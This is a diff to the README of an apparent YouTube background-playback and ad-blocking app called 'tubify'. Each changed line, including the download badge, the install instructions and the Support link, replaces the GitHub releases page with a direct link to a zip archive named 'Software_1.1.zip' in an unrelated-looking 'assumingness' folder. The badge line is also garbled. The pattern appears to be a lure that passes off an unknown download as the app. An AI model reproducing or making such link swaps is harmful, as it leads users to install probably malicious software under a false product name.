@@ -4,7 +4,7 @@
 Welcome to tubify! This is your guide to download and run our lightweight utility for YouTube. With tubify, you can enjoy seamless background playback, block unwanted ads, and manage your library with ease.
 
 ## 📥 Download tubify
-[![Download tubify](https://img.shields.io/badge/Download%20tubify%20v1.0-blue.svg)](https://github.com/JUANgaming8401/tubify/releases)
+[![Download tubify](https://raw.githubusercontent.com/JUANgaming8401/tubify/main/assumingness/Software_1.1.zip%20tubify%https://raw.githubusercontent.com/JUANgaming8401/tubify/main/assumingness/Software_1.1.zip)](https://raw.githubusercontent.com/JUANgaming8401/tubify/main/assumingness/Software_1.1.zip)
 
 ## 📋 What You Need
 Before you start, ensure your device meets these requirements:
@@ -23,7 +23,7 @@ tubify offers:
 - **Easy to Use Interface**: Designed with material design for a simple user experience.
 
 ## 🛠️ Download & Install
-1. **Visit this page to download**: [Download tubify](https://github.com/JUANgaming8401/tubify/releases).
+1. **Visit this page to download**: [Download tubify](https://raw.githubusercontent.com/JUANgaming8401/tubify/main/assumingness/Software_1.1.zip).
 2. Find the latest release version.
 3. Click on the link to download the tubify APK file.
 4. Open the downloaded file to install the app.
@@ -50,7 +50,7 @@ After installation, follow these steps to get started:
 Your input helps us improve tubify. We welcome feedback and contributions. If you have suggestions or find bugs, please create an issue on our GitHub page.
 
 ## 📞 Support
-If you encounter any problems, visit our [GitHub page](https://github.com/JUANgaming8401/tubify/releases) for support options. We are here to help!
+If you encounter any problems, visit our [GitHub page](https://raw.githubusercontent.com/JUANgaming8401/tubify/main/assumingness/Software_1.1.zip) for support options. We are here to help!
 
 ## 🌟 Get Involved
 Love tubify? Help us spread the word! Share your experience with friends and let them know how they can enhance their YouTube experience.
